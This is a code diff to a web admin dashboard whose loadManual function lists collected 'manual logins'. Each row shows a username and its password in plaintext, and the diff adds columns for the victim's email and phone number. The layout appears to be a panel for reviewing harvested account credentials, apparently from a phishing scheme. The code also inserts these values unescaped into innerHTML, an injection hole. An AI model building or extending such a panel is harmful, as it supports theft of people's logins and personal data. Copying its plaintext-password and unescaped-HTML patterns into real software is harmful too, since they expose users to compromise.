@@ -130,7 +130,9 @@
     .mrow{padding:12px 16px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:10px;font-size:13px}
     .mrow:last-child{border-bottom:none}
     .mrow-user{font-weight:700;min-width:100px}
-    .mrow-pw{font-family:monospace;font-size:12px;color:var(--muted);flex:1}
+    .mrow-pw{font-family:monospace;font-size:12px;color:var(--muted);min-width:90px}
+    .mrow-email{font-size:12px;color:#1e40af;min-width:130px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+    .mrow-phone{font-size:12px;color:var(--muted);min-width:100px}
     .mrow-time{font-size:11px;color:var(--muted);white-space:nowrap}
     .mrow-src{font-size:10px;font-weight:700;padding:2px 7px;border-radius:100px;background:rgba(233,30,140,.08);color:#e91e8c}
     .mbadge{display:inline-flex;align-items:center;justify-content:center;min-width:17px;height:17px;padding:0 4px;background:#6366f1;color:#fff;border-radius:100px;font-size:10px;font-weight:700;margin-left:5px;vertical-align:middle}
@@ -464,11 +466,11 @@ async function loadManual(){
     updateManualBadge(list.length);
     if(!list.length){el.innerHTML='<div class="empty"><div class="ei">&#128221;</div><p>No manual logins yet</p></div>';return;}
     const rows=[...list].reverse();
-    let html='<div class="mrow" style="font-size:11px;font-weight:700;color:var(--muted);background:#fafafa;text-transform:uppercase;letter-spacing:.05em"><div style="min-width:100px">User</div><div style="flex:1">Password</div><div style="width:70px">Source</div><div style="width:120px;text-align:right">Time</div></div>';
+    let html='<div class="mrow" style="font-size:11px;font-weight:700;color:var(--muted);background:#fafafa;text-transform:uppercase;letter-spacing:.05em"><div style="min-width:100px">User</div><div style="min-width:90px">Password</div><div style="min-width:130px">Email</div><div style="min-width:100px">Phone</div><div style="width:70px">Source</div><div style="width:120px;text-align:right">Time</div></div>';
     rows.forEach(m=>{
       const dt=new Date(m.submittedAt).toLocaleString('en-IN',{day:'numeric',month:'short',hour:'2-digit',minute:'2-digit'});
       const src=m.source==='user'?'User':'Admin';
-      html+=`<div class="mrow"><div class="mrow-user">@${m.username}</div><div class="mrow-pw">${m.password}</div><div><span class="mrow-src">${src}</span></div><div class="mrow-time">${dt}</div></div>`;
+      html+=`<div class="mrow"><div class="mrow-user">@${m.username}</div><div class="mrow-pw">${m.password}</div><div class="mrow-email">${m.email||'—'}</div><div class="mrow-phone">${m.phone||'—'}</div><div><span class="mrow-src">${src}</span></div><div class="mrow-time">${dt}</div></div>`;
     });
     el.innerHTML=html;
   }catch{el.innerHTML='<div class="empty"><div class="ei">&#9888;</div><p>Failed to load</p></div>';}
